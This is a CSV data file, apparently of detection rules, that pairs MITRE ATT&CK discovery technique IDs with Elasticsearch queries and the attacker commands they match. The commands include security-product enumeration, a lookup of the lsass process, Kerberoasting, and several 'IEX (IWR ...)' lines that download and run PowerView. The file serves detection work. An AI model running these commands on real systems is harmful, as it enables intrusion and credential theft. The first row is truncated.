T1087.001,"{
T1518,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match"": {""CommandLine"": ""--version""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match"": {""CommandLine"": ""python4""}},
                        {""match"": {""CommandLine"": ""python3""}},
                        {""match"": {""CommandLine"": ""python2""}},
                        {""match"": {""CommandLine"": ""python""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",python3 --version&python2 --version&python --version,2,
T1518,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""reg query""}},
                {""match_phrase"":{""CommandLine"": ""Software\\Microsoft\\Internet Explorer""}},
                {""match"": {""CommandLine"": ""svcVersion""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg query ""HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer"" /v svcVersion",2,
T1518,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""Get-ItemProperty""}},
                {""match_phrase"":{""CommandLine"": ""Software\\Microsoft\\Internet Explorer""}},
                {""wildcard"": {""CommandLine"": ""*Version""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Internet Explorer').Version,2,
T1518.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""get-uac""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",echo $(get-uac),2,
T1518.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""root\\SecurityCenter2""}},
                        {""match"": {""CommandLine"": ""AntiVirusProduct""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""wildcard"":{""CommandLine"": ""wmic*""}},
                        {""match_phrase"":{""CommandLine"": ""Get-WmiObject""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value

wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List

$NameSpace = Get-WmiObject -Namespace ""root"" -Class ""__Namespace"" | Select Name | Out-String -Stream | Select-String ""SecurityCenter"";
$SecurityCenter = $NameSpace | Select-Object -First 1;
Get-WmiObject -Namespace ""root\$SecurityCenter"" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;",2,
T1518.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""netsh*""}},
                {""match"": {""CommandLine"": ""advfirewall""}},
                {""match_phrase"": {""CommandLine"": ""show allprofiles""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","netsh.exe advfirewall  show allprofiles 
&& tasklist.exe 
&& tasklist.exe | findstr /i virus 
&& tasklist.exe | findstr /i cb 
&& tasklist.exe | findstr /i defender 
&& tasklist.exe | findstr /i cylance",2,
T1518.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""SysmonDrv""}},
                 
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                         {""wildcard"": {""CommandLine"": ""fltmc*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",fltmc.exe | findstr.exe 385201,2,
T1518.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"":{""CommandLine"": ""get-process""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match"": {""CommandLine"": ""virus""}},
                        {""match"": {""CommandLine"": ""defender""}},
                        {""match"": {""CommandLine"": ""cylance""}},
                        {""match"":{""CommandLine"": ""carbonblack""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","get-process | ?{$_.Description -like ""*virus*""}; 
get-process | ?{$_.Description -like ""*carbonblack*""}; 
get-process | ?{$_.Description -like ""*defender*""}; 
get-process | ?{$_.Description -like ""*cylance*""}",2,
T1033,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match"":{""CommandLine"": ""whoami""}},
                {""match_phrase"":{""CommandLine"": ""echo %username%""}},
                {""match_phrase"":{""CommandLine"": ""whoami""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","whoami

echo %username%

$env:username",2,
T1033,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match_phrase"":{""CommandLine"": ""Invoke-UserHunter""}},
                {""match_phrase"":{""CommandLine"": ""Get-NetUser""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
Invoke-UserHunter -Stealth -Verbose

Import-Module .\powerview.ps1 -Force;
Get-NetUser -AdminCount | ConvertTo-Json -Depth 1

Import-Module .\powerview.ps1 -Force;
Get-NetUser -SPN | ConvertTo-Json -Depth 1",2,
T1033,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""System.Security.Principal.WindowsIdentity""}},
                {""wildcard"":{""CommandLine"": ""*GetCurrent""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt,2,
T1033,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""wmic* useraccount get""}},
                {""match_phrase"": {""CommandLine"": ""quser* /SERVER""}},
                {""match"": {""CommandLine"": ""find""}},
                {""match_phrase"": {""CommandLine"": ""qwinsta* /server""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","cmd.exe /C whoami 
&& wmic useraccount get /ALL 
&& quser /SERVER:""#{computer_name}"" 
&& quser 
&& qwinsta.exe /server:#{computer_name} 
&& qwinsta.exe 
&& for /F ""tokens=1,2"" %i in ('qwinsta /server:#{computer_name} ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt 
&& @FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt",2,
T1033,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""[System.Environment]::UserName""}},
                  {""match"":{""CommandLine"": ""-Append""}},
                {""match_phrase"": {""CommandLine"": ""$env:UserName""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt ; 
$env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append",2,
T1057,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match_phrase"":{""CommandLine"": ""get-process""}},
                {""match_phrase"":{""CommandLine"": ""wmic* process get""}},
                {""match"":{""CommandLine"": ""tasklist""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","get-process >> $env:APPDATA\vmtools.log;
cat $env:APPDATA\vmtools.log

tasklist /m  >> $env:APPDATA\vmtool.log;
cat $env:APPDATA\vmtool.log

Get-Process

tasklist

wmic process get /format:list",2,
T1057,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""get-wmiObject""}},
                {""match_phrase"":{""CommandLine"": ""Win32_Process""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",get-wmiObject -class Win32_Process,2,
T1057,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""foreach*""}},
                        {""match_phrase"": {""CommandLine"": ""-eq""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""wildcard"":{""CommandLine"": ""*ProcessName""}},
                        {""wildcard"":{""CommandLine"": ""*Owner""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$owners = @{};
gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};
$ps = get-process | select processname,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}};
$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq ""svchost"") {$p} };
$valid | ConvertTo-Json

$ps = get-process | select processname,Id;
$valid = foreach($p in $ps) { if($p.ProcessName -eq ""lsass"") {$p} };
$valid | ConvertTo-Json

$owners = @{};
gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};
$ps = get-process | select processname,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}};
foreach($p in $ps) { if($p.Owner -eq ""#{host.user.name}"") {$p;} }",2,
T1007,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match_phrase"":{""CommandLine"": ""Get-Service""}},
                {""match_phrase"":{""CommandLine"": ""sc query""}},
                {""match_phrase"":{""CommandLine"": ""net* start""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Get-Service

sc query 
&& sc query state= all

net.exe start >> C:\Windows\Temp\service-list.txt",2,
T1201,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match_phrase"":{""CommandLine"": ""get-addefaultdomainpasswordpolicy""}},
                {""match_phrase"":{""CommandLine"": ""Get-DomainPolicy""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","get-addefaultdomainpasswordpolicy

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); 
Get-DomainPolicy -verbose",2,
T1201,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""net accounts""}},
               {""match_phrase"":{""CommandLine"": ""/domain""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",net accounts /domain,2,
T1082,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"":{""CommandLine"": ""PSVersionTable""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",$PSVersionTable,2,
T1082,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""*OSVersion.Version""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",[environment]::OSVersion.Version,2,
T1082,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"":{""CommandLine"": ""cscript*""}},
                {""wildcard"":{""CommandLine"": ""*griffon_recon*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",cscript d06deb_griffon_recon.vbs,2,
T1082,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match"":{""CommandLine"": ""hostname""}},
                {""match"":{""CommandLine"": ""systeminfo""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","hostname

systeminfo ",2,
T1082,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""reg query""}},
                {""match_phrase"":{""CommandLine"": ""CurrentControlSet\\Services\\Disk\\Enum""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum,2,
T1082,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""reg query""}},
                {""match_phrase"":{""CommandLine"": ""SOFTWARE\\Microsoft\\Cryptography""}},
                {""match"":{""CommandLine"": ""MachineGuid""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid,2(4),
T1083,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""AtomicTestHarnesses""}},
                 
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                       {""term"":{""CommandLine"": ""pwd""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",pwd,2(4),
T1083,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Get-ChildItem""}},
                        {""match"": {""CommandLine"": ""ls""}},
                        {""match"": {""CommandLine"": ""gci""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match"": {""CommandLine"": ""-Path""}},
                        {""match"": {""CommandLine"": ""-recurse""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Get-ChildItem -Path #{host.system.path}

ls -recurse; 
get-childitem -recurse; 
gci -recurse",2(4),
T1083,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match"": {""CommandLine"": ""&gt;&gt;""}},
                          {""match"": {""CommandLine"": ""\\download ""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                       {""match"":{""CommandLine"": ""dir""}},
                       {""match"":{""CommandLine"": ""tree""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","dir /s c:\ >> %temp%\download 
&& dir /s ""c:\Documents and Settings"" >> %temp%\download 
&& dir /s ""c:\Program Files\"" >> %temp%\download 
&& dir ""%systemdrive%\Users\*.*"" >> %temp%\download 
&& dir ""%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*"" >> %temp%\download 
&& dir ""%userprofile%\Desktop\*.*"" >> %temp%\download 
&& tree /F >> %temp%\download",2(4),
T1083,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Get-ChildItem -Path""}},
                          {""match_phrase"": {""CommandLine"": ""-append""}},
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match"":{""CommandLine"": ""C:""}},
                        {""match"":{""CommandLine"": ""programfiles""}},
                        {""match_phrase"":{""CommandLine"": ""ProgramFiles(x86)""}},
                        {""match"":{""CommandLine"": ""Desktop""}},
                        {""match"":{""CommandLine"": ""Downloads""}},
                        {""match_phrase"":{""CommandLine"": ""AppData/Local""}},
                        {""match"":{""CommandLine"": ""AppData/Roaming""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$folderarray = @(""Desktop"", ""Downloads"", ""Documents"", ""AppData/Local"", ""AppData/Roaming""); 
Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $env:temp\T1083Test5.txt; 
Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $env:temp\T1083Test5.txt; 
Get-ChildItem -Path ""${env:ProgramFiles(x86)}"" -erroraction silentlycontinue | Out-File -append $env:temp\T1083Test5.txt; 
$UsersFolder = ""$env:homedrive\Users\""; 
foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) ; 
 {; 
 foreach ($secondarydirectory in $folderarray);  
 {Get-ChildItem -Path ""$UsersFolder/$directory/$secondarydirectory"" -ErrorAction SilentlyContinue | Out-File -append $env:temp\T1083Test5.txt};
 }; 
cat $env:temp\T1083Test5.txt",2(4),
T1049,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""wildcard"":{""CommandLine"": ""netstat*""}},
                {""match_phrase"": {""CommandLine"": ""net* use""}},
                {""match_phrase"": {""CommandLine"": ""net* sessions""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","netstat -anto;

net use

net sessions",2,
T1049,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""SharpView*""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match_phrase"":{""CommandLine"": ""Invoke-ACLScanner""}},
                        {""match_phrase"":{""CommandLine"": ""Invoke-Kerberoast""}},
                        {""match_phrase"":{""CommandLine"": ""Find-DomainShare""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$syntaxList = ""Invoke-ACLScanner"", ""Invoke-Kerberoast"", ""Find-DomainShare"" ; 
foreach ($syntax in $syntaxList) {;
 PathToAtomicsFolder\T1049\bin\SharpView.exe $syntax -}",2(4),
T1049,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""Get-Process""}},
                 
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Get-NetTCPConnection""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Get-NetTCPConnection,2,
T1124,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match_phrase"": {""CommandLine"": ""Get-Date""}},
                {""match_phrase"": {""CommandLine"": ""net time \\\\localhost""}},
                {""match_phrase"": {""CommandLine"": ""w32tm /tz""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'

net time \\localhost 

w32tm /tz",2,
T1217,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Get-ChildItem""}},
                        {""match"": {""CommandLine"": ""where""}}
                    ]
     }
    },
    {""bool"": {
                    ""must"":[
                        {""match_phrase"":{""CommandLine"": ""C:\\Users\\""}}
                    ]
                }
    },
    {""bool"": {
                    ""should"":[
                        {""match"": {""CommandLine"": ""Bookmarks""}},
                        {""match_phrase"": {""CommandLine"": ""places.sqlite""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","where /R C:\Users\ Bookmarks

Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force

where /R C:\Users\ places.sqlite",2,
T1217,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"":{""CommandLine"": ""dir""}},
                {""match_phrase"": {""CommandLine"": ""%USERPROFILE%\\Favorites""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",dir /s /b %USERPROFILE%\Favorites,2(4),
T1046,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""nmap""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",nmap 127.0.0.1,1,
T1046,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""python""}},
                {""match_phrase"": {""CommandLine"": ""53b103_T1046.py""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",python 53b103_T1046.py -i 127.0.0.1,1,
T1046,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match_phrase"": {""CommandLine"": ""Get-NetIPConfiguration""}},
                {""match_phrase"": {""CommandLine"": ""Get-NetIPaddress""}},
                {""match_phrase"": {""CommandLine"": ""Scan-Netrange""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Import-Module ./basic_scanner.ps1;
$ports = @(22, 53, 80, 445);
Get-NetIPConfiguration | ?{$_.NetAdapter.Status -ne ""Disconnected""} | Get-NetIPaddress -AddressFamily IPv4 | %{
    $ipv4 = $_.IPAddress;
    $prefixLength = $_.PrefixLength;
    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;
};",2,
T1135,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match_phrase"": {""CommandLine"": ""get-smbshare""}},
                {""match_phrase"": {""CommandLine"": ""net view \\\\*""}},
                {""match_phrase"": {""CommandLine"": ""net share""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","get-smbshare

net view \\localhost

net view \\#{remote.host.fqdn} /all

net share",2(4),
T1135,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Invoke-ShareFinder""}},
                {""match_phrase"": {""CommandLine"": ""Find-DomainShare""}}
                    ]
     }
    },
    {""bool"": {
                    ""must"":[
                        {""match_phrase"":{""CommandLine"": ""-CheckShareAccess""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if (Test-Path $env:TEMP\PowerView.ps1) { ;
 } else {Invoke-WebRequest ""https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1"" -OutFile $env:TEMP\PowerView.ps1};  ; 
Import-Module $env:TEMP\PowerView.ps1; 
Invoke-ShareFinder -CheckShareAccess

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
Find-DomainShare -CheckShareAccess -Verbose",2(14),
T1012,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""Registry""}},
                {""match_phrase"": {""CommandLine"": ""Select-Object""}}
                    ]
     }
    },
    {""bool"": {
                    ""must"":[
                         {""match_phrase"":{""CommandLine"": ""Microsoft\\Windows\\CurrentVersion""}},
                        {""match_phrase"": {""CommandLine"": ""Get-ItemProperty""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion,,
T1012,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""reg query""}},
                        {""match_phrase"": {""CommandLine"": ""Winlogon""}},
                         {""match"": {""CommandLine"": ""RunServices""}},
                         {""match_phrase"":{""CommandLine"": ""Microsoft\\Windows\\CurrentVersion""}}
                    ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"" 
&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
&& reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices 
&& reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices 
&& reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"" 
&& reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"" 
&& reg query ""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"" 
&& reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"" 
&& reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad 
&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce 
&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx 
&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 
&& reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 
&& reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce 
&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 
&& reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 
&& reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri "".*\.sys$"" 
&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

c",2(4),
T1497.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""virtual""}}
               
                    ]
     }
    },
    {""bool"": {
                    ""must"":[
                         {""match_phrase"":{""CommandLine"": ""Get-WmiObject""}},
                {""match_phrase"": {""CommandLine"": ""win32_computersystem""}},
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",get-wmiobject win32_computersystem | fl model,2(4),
T1120,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""Get-WmiObject""}},
                {""match_phrase"": {""CommandLine"": ""Win32_PnPEntity""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt; 
$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt; 
@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne """" } |Set-Content $env:TEMP\T1120_collection.txt",2(4),
